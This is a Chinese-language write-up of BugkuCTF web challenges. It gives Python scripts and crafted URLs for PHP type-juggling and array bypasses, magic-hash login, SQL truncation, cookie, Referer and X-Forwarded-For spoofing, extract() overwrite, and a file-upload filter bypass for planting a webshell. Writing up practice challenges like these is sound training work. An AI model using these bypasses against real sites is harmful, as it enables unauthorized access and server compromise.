web部分的20-36题。welcome to bugkuctf 和 过狗一句话 这两道题打开404

# 秋名山老司机

每次打开刷新网页，要计算的内容都要变化

![秋名山老司机](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/秋名山老司机.png)

亲请在2s内计算老司机的车速是多少

702165421+1154429138+1042541861*338334935-739834476-1652744732-1887097714-244715547*1461030294-401250319-977461116=?;

Give me value post about 1531922609+1823637330*1021219038*24080258-1453837304+724139088+460522784-596962562-1691520371*1512685444-1749655109=?

使用 burpsuite 抓包得到下面的内容，下面的 `Set-Cookie: PHPSESSID` 暗示要在一个会话中进行。

```
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 23 Nov 2019 07:40:30 GMT
Content-Type: text/html
Connection: close
Set-Cookie: PHPSESSID=p80dhos8d9fqntg2q0qnafdntrpir5hj; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: Timeout=alive; expires=Sat, 23-Nov-2019 07:40:32 GMT
Content-Length: 347
```

`Give me value post about` 提示给出是用 POST 请求，发送 value 值，两秒内肯定自己算不出来，写一个python脚本如下

```python
import requests
import re  # 这个库一般用来匹配文字

url = 'http://123.206.87.240:8002/qiumingshan/'  # url
r = requests.session()  # requests.sesssion()对象可以跨请求的保存某些参数
g = r.get(url)  # 产生一个请求资源的对象，get方法
# 使用re库中的findall方法，匹配正则。第一个参数是要匹配的正则表达式，第二个参数是将我们请求到的资源变成字符串的形式，再以列表的形式返回到变量ans中
ans = re.findall('<div>(.*?)=?;</div>', g.text)
ans = "".join(ans)  # 将ans从列表的形式转化为字符串的形式
ans = ans[:-2]  # 去掉ans最后的两个字符，这里即去掉 =？
print(ans)  # 测试打印一下
post = eval(ans)  # 执行我们处理完的字符串，即那个变态的表达式
data = {'value': post}  # 构造data的post部分
flag = r.post(url, data=data)  # 生成post请求，post的值是算出来的结果
print(flag) # 测试打印返回的结果
print(flag.text)  # 打印返回的数据即flag值
```

运行这段脚本，即可得到flag

# 速度要快

打开题目源码的注释中有这么一句：<!-- OK ,now you have to post the margin what you find -->

通过抓包得到了下面的内容，下面的 `Set-Cookie: PHPSESSID` 暗示要在一个会话中进行。

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 17 Nov 2019 07:45:55 GMT
Content-Type: text/html;charset=utf-8
Connection: close
Set-Cookie: PHPSESSID=v3p9s5foi1t6b351e05nm86e6pk49js3; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTXpNd05URTM=
Content-Length: 89

</br>ææè§ä½ å¾å¿«ç¹!!!<!-- OK ,now you have to post the margin what you find -->
```

将 flag 那个字段进行 base64 解码，得到的是**跑的还不错，给你flag吧: MzMwNTE3**，然而这是不对的，后来发现每次抓包 flag 那个字段都会改变（因为会话的不同），所以要写脚本。运行下面这段脚本，即可得到 flag

```python
import requests
import base64

url = "http://123.206.87.240:8002/web6/"
r = requests.session()
headers = r.get(url).headers  # 因为flag在消息头里
mid = base64.b64decode(headers['flag'])

print(mid) # 这里解码出来是byte类型的
# b'\xe8\xb7\x91\xe7\x9a\x84\xe8\xbf\x98\xe4\xb8\x8d\xe9\x94\x99\xef\xbc\x8c\xe7\xbb\x99\xe4\xbd\xa0flag\xe5\x90\xa7: NjM5ODk5'

mid = mid.decode()  # 为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的

print(mid)
# 跑的还不错，给你flag吧: NjM5ODk5

flag = base64.b64decode(mid.split(':')[1])  # 获得flag:后的值，这里不知道为什么还有这一步解码

print(flag)
# b'639899'

data = {'margin': flag}

print(r.post(url, data).text)  # post方法传上去
# KEY{111dd62fcd377076be18a}
```

# cookies欺骗

这是题目给出的url：`http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=`，将`a2V5cy50eHQ=` 进行 base64 解码得到 keys.txt

尝试用 filename 访问 index.php（原url使用base64，这也将 index.php 进行编码，得到 aW5kZXgucGhw），line参数应该是行数，试一下 line=2

即访问 http://123.206.87.240:8002/web11/index.php?line=2&filename=aW5kZXgucGhw，得到了这一串代码`$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");`

用脚本将index.php的源码读取出来

```python
import requests
a = 30
for i in range(a):
    url = "http://123.206.87.240:8002/web11/index.php?line=" + \
        str(i)+"&filename=aW5kZXgucGhw"
    s = requests.get(url)
    print(s.text)
```

运行上面的代码，可以得到下面的php代码

```php
<?php

error_reporting(0);

$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");

$file_list = array(

'0' =>'keys.txt',

'1' =>'index.php',

);



if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){

$file_list[2]='keys.php';

}



if(in_array($file, $file_list)){

$fa = file($file);

echo $fa[$line];

}

?>
```

分析 php 代码，前面判断传参，后面判断 cookie 必须满足 margin=margin 才能访问 keys.php

编写 python 脚本

```python
import requests
flag = 20
cookies = {"margin": "margin"}
for i in range(flag):
    url = "http://123.206.87.240:8002/web11/index.php?line=" + \
        str(i)+"&filename=a2V5cy5waHA="
    s = requests.get(url, cookies=cookies)
    print(s.text)
```

运行得到flag

# never give up

网页中只有这么一段：never never never give up !!!，打开题目网页查看源码发现有个 1p.html

```html
<!--1p.html-->
never never never give up !!!
```

进行访问：http://123.206.87.240:8006/test/1p.html 发现进入了bugku的论坛，感觉没什么用

就访问 `view-source:http://123.206.87.240:8006/test/1p.html`，查看一下源码。

```html
<HTML>
<HEAD>
<SCRIPT LANGUAGE="Javascript">
<!--
var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
// -->
</SCRIPT>
</HEAD>
<BODY>
</BODY>
</HTML>
```

发现一大段被注释掉的 JavaScript 代码

```javascript
var Words ="..." 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
```

把`document.write` 换成 `console.log`，可以在控制台得到下面的内容（也可以直接使用 urlDecode 进行解密）

```
<script>window.location.href='http://www.bugku.com';</script> 
<!-- 一段base64编码 -->
```

![never give up](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/永不言弃.png)

发现有一层 base64，将其解密得到下面的 php 代码。

```php
";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}


?>
```

阅读源码，直接访问 http://123.206.87.240:8006/test/f4l2a3g.txt 即可得到flag

# 字符？正则？

打开题目页面，有一段下面的代码，是考察正则表达式的。

```php
<?php 
highlight_file('2.php');
$key='KEY{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){ 
  die('key is: '.$key);
}
?>
```

构造 `http://123.206.87.240:8002/web10/?id=keyykeyyyyykey:///1keya.`，即可得到flag

# 前女友(SKCTF)

打开链接发现下面的代码，md5 加密比较 get 方法的 v1，v2 和 v3

```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

`http://123.206.31.85:49162/?v1[]=1&&v2[]=2&&v3[]=3`，构造出 `?v1[]=1&&v2[]=2&&v3[]=3`，得到flag

# login1(SKCTF)

打开网站如下：

![login1](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/login1.png)

![login1_2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/login1_2.png)

提示我们用 hint:SQL约束攻击

我们需要做的就是注册一个在数据库中会被认为是admin的账户，然后使用这个admin账户登录。

注册用户名为

admin                  （注册的admin后面有18个空格）

密码随便写一个，但要符合要求

注册成功之后用这个注册的登录就拿到了 flag

# 你从哪里来

打开题目网站提示我们：are you from google?

那么我们修改http referer头即可，使用 burpsuite 抓包，请求头添加上 `Referer:https://www.google.com`

![你从哪里来](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5.png)

也可以用下面的 python 脚本

```python
import requests

url = "http://123.206.87.240:9009/from.php"
headers = {'Referer': 'https://www.google.com'}
r = requests.get(url, headers=headers)
print(r.text)
```

# md5 collision(NUPT_CTF)

> https://blog.csdn.net/dyw_666666/article/details/82348564

题目网址是 `http://123.206.87.240:9009/md5.php`，提示我们 please input a

构造 `http://123.206.87.240:9009/md5.php?a=1`，提示 false!!!

构造 `http://123.206.87.240:9009/md5.php?a=240610708`，得到flag

PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。

攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。

# 程序员本地网站

打开题目地址 `http://123.206.87.240:8002/localhost/`，提示我们：请从本地访问！

与管理员系统那个题非常类似，使用 burpsuite 抓包，在请求头里加上**X-Forwarded-For: 127.0.0.1** 就好了。

![程序员本地网站](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99.png)

也可以用 python 脚本

```python
import requests

url = "http://123.206.87.240:8002/localhost/"
headers = {'X-Forwarded-For': '127.0.0.1'}
r = requests.get(url, headers=headers)
print(r.text)
```

# 各种绕过

阅读给出的代码，发现只要使uname的sha1和值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等，只要构造数组就可以了，借助了hackbar

get方法构造出 `http://123.206.87.240:8002/web7/?id=margin&uname[]=1`，post 方法的参数为 passwd[]=2

![各种绕过](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87.png)

# web8

题目提示我们：txt？？？？

进入 `http://123.206.87.240:8002/web8/flag.txt`，网页显示 flags

进入题目网站 `http://123.206.87.240:8002/web8/`，有一段 php 代码如下：

```php
<?php
extract($_GET);
if (!empty($ac))
{
$f = trim(file_get_contents($fn));
if ($ac === $f)
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```

阅读代码知：$ac 是指 flag.txt 中的内容 flags，$fn 指的是 flag.txt 这个文件。

构造 `http://123.206.87.240:8002/web8/?ac=flags&fn=flag.txt`，访问就得到了 flag

# 细心

提示：想办法变成 admin

![细心](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/细心.png)

使用御剑扫描出了 http://123.206.87.240:8002/web13/robots.txt，内容如下：

```
User-agent: *
Disallow: /resusl.php
```

然后访问 http://123.206.87.240:8002/web13/resusl.php，得到下面的内容

![细心2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/细心2.png)

Warning:你不是管理员你的IP已经被记录到日志了

36.156.65.49

------

By bugkuctf.

if ($_GET[x]==$password) 此处省略1w字

也就知道了要get方法传参**x=admin**，即 http://123.206.87.240:8002/web13/resusl.php?x=admin，得到flag

![细心3](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/细心3.png)

# 求getshell

题目提示：My name is margin,give me a image file not a php

一道典型的文件上传的题目，显然只允许上传图片格式，不允许上传PHP脚本，但我们就是要上传一句话木马！

提交之后抓包，要修改三个地方：

1、扩展名filename

2、filename下面一行的Content-Type:image/jpeg

3、最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可

关于扩展名：

试验过php2, php3, php4, php5，phps, pht, phtm, phtml之后，发现只有php5可以绕过

未修改之前如下图所示：

![求getshell1](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E6%B1%82getseller.png)

修改之后

![求getshell2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E6%B1%82getseller2.png)